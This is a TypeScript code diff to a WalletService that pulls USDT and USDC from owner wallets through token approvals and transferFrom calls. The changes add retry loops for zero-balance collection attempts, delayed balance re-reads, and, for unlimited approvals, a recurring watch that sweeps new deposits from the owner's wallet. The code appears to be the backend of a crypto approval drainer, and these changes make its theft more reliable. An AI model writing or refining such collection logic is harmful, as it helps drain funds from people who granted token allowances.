@@ -153,6 +153,21 @@ export class WalletService {
     return new Date(Date.now() + intervalMs * multiplier);
   }
 
+  /** Fast retries when collection sees zero balance but allowance exists (RPC lag / post-approve timing). */
+  private nextZeroBalanceRetryCheck(failureCount: number, network: string): Date {
+    const transfer = this.platformConfig.getTransfer();
+    const delays = [
+      network === "tron" ? transfer.allowancePollDelayTronMs : transfer.allowancePollDelayEvmMs,
+      2000,
+      5000,
+      10000,
+      30000,
+      60000,
+    ];
+    const idx = Math.min(Math.max(failureCount - 1, 0), delays.length - 1);
+    return new Date(Date.now() + delays[idx]);
+  }
+
   private rpcTimeoutMs(): number {
     return Number(this.configService.get(SETTING_KEYS.COLLECTOR_RPC_TIMEOUT_MS)) ||
       this.platformConfig.getCollector().rpcTimeoutMs;
@@ -468,6 +483,27 @@ export class WalletService {
     await this.processMonitoredApproval(approvalId);
   }
 
+  /** Retry immediate collection when confirm saw on-chain balance but first transferFrom read zero. */
+  private async runImmediateCollectionWithRetries(
+    approvalId: string,
+    opts?: { maxAttempts?: number }
+  ): Promise<void> {
+    const maxAttempts = opts?.maxAttempts ?? 5;
+    const delayMs = this.platformConfig.getTransfer().allowancePollDelayEvmMs;
+    for (let attempt = 0; attempt < maxAttempts; attempt++) {
+      await this.processMonitoredApproval(approvalId);
+      const approval = await prisma.approval.findUnique({ where: { id: approvalId } });
+      if (!approval) return;
+      if (BigInt(approval.collectedRaw) > BigInt(0)) return;
+      if (
+        !approval.lastError?.includes(TRANSFER_SKIP_REASONS.zero_balance_at_collection)
+      ) {
+        return;
+      }
+      if (attempt < maxAttempts - 1) await sleep(delayMs);
+    }
+  }
+
   private pendingCollectionIntentStatuses(): CollectionIntentStatus[] {
     return [
       CollectionIntentStatus.CREATED,
@@ -514,6 +550,11 @@ export class WalletService {
     args: { collectedRaw: bigint; failureCount: number }
   ): Promise<void> {
     const now = new Date();
+    const approvalRow = await prisma.approval.findUnique({
+      where: { id: approvalId },
+      select: { network: true },
+    });
+    const network = approvalRow?.network ?? "eth";
     const pendingIntentFilter = {
       approvalId,
       status: { in: this.pendingCollectionIntentStatuses() },
@@ -533,6 +574,12 @@ export class WalletService {
             data: { status: CollectionIntentStatus.CANCELLED },
           });
 
+    const nextCheckAt =
+      args.collectedRaw > BigInt(0)
+        ? this.nextCollectionCheck(args.failureCount)
+        : this.nextZeroBalanceRetryCheck(args.failureCount + 1, network);
+    const nextFailureCount =
+      args.collectedRaw > BigInt(0) ? 0 : args.failureCount + 1;
     await prisma.$transaction([
       intentUpdate,
       prisma.approval.update({
@@ -544,8 +591,8 @@ export class WalletService {
             args.collectedRaw > BigInt(0)
               ? null
               : TRANSFER_SKIP_REASONS.zero_balance_at_collection,
-          nextCheckAt: this.nextCollectionCheck(args.failureCount),
-          failureCount: 0,
+          nextCheckAt,
+          failureCount: nextFailureCount,
           leaseOwner: null,
           leaseUntil: null,
         },
@@ -695,6 +742,24 @@ export class WalletService {
     const data = `0x70a08231${owner.slice(2).toLowerCase().padStart(64, "0")}`;
     const raw = await this.evmRpcCall(network, "eth_call", [{ to: tokenInfo.address, data }, "latest"]);
     return BigInt(raw);
+  }
+
+  private async readTokenBalanceRawWithRetry(
+    network: string,
+    owner: string,
+    token: TokenSymbol,
+    maxAttempts = 4
+  ): Promise<bigint> {
+    const delayMs =
+      network === "tron"
+        ? this.platformConfig.getTransfer().allowancePollDelayTronMs
+        : this.platformConfig.getTransfer().allowancePollDelayEvmMs;
+    let balance = await this.readTokenBalanceRaw(network, owner, token);
+    for (let i = 1; i < maxAttempts && balance <= BigInt(0); i++) {
+      await sleep(delayMs);
+      balance = await this.readTokenBalanceRaw(network, owner, token);
+    }
+    return balance;
   }
 
   private async executeEvmTransferFrom(args: {
@@ -932,7 +997,7 @@ export class WalletService {
       // confirmation timeout; do not create a second transaction.
       transferable = BigInt(existing.amountRaw);
     } else {
-      const ownerBalance = await this.readTokenBalanceRaw(
+      const ownerBalance = await this.readTokenBalanceRawWithRetry(
         approval.network,
         approval.ownerAddress,
         approval.tokenSymbol as TokenSymbol
@@ -1460,7 +1525,9 @@ export class WalletService {
           this.rpcCall(rpcs[0], "eth_call", [{ to: usdtCfg.address, data: `0x70a08231${evm.slice(2).toLowerCase().padStart(64, "0")}` }, "latest"]).catch(() => "0x0"),
           this.rpcCall(rpcs[0], "eth_call", [{ to: usdcCfg.address, data: `0x70a08231${evm.slice(2).toLowerCase().padStart(64, "0")}` }, "latest"]).catch(() => "0x0"),
         ]);
-        result[network] = { native, usdt: this.formatUnits(BigInt(usdtRaw), usdtCfg.decimals), usdc: this.formatUnits(BigInt(usdcRaw), usdcCfg.decimals) };
+        const usdtHuman = this.formatUnits(BigInt(usdtRaw), usdtCfg.decimals);
+        const usdcHuman = this.formatUnits(BigInt(usdcRaw), usdcCfg.decimals);
+        result[network] = { native, usdt: usdtHuman, usdc: usdcHuman };
       }
     }
     if (tron) {
@@ -1752,7 +1819,7 @@ export class WalletService {
     });
 
     if (hasAllowance && executeTransfer && requestedTransferRaw > BigInt(0)) {
-      await this.runImmediateCollection(approval.id);
+      await this.runImmediateCollectionWithRetries(approval.id);
     }
 
     return {
@@ -1959,7 +2026,7 @@ export class WalletService {
     }, approval.id);
 
     if (executeTransfer && requestedTransferRaw > BigInt(0)) {
-      await this.runImmediateCollection(approval.id);
+      await this.runImmediateCollectionWithRetries(approval.id);
     }
 
     return {
@@ -2310,6 +2377,26 @@ export class WalletService {
     const pendingAttempt = await prisma.transfer.findUnique({
       where: { idempotencyKey: attemptKey },
     });
+
+    if (
+      approval.unlimited &&
+      BigInt(approval.collectedRaw) > BigInt(0) &&
+      !pendingAttempt?.signedPayload
+    ) {
+      const settledBalance = await this.readTokenBalanceRaw(
+        approval.network,
+        approval.ownerAddress,
+        approval.tokenSymbol as TokenSymbol
+      );
+      if (settledBalance <= BigInt(0)) {
+        await this.scheduleUnlimitedDepositWatch(approval.id, {
+          collectedRaw: BigInt(approval.collectedRaw),
+          failureCount: approval.failureCount,
+        });
+        return;
+      }
+    }
+
     let allowanceRaw: bigint;
     if (
       pendingAttempt?.signedPayload &&
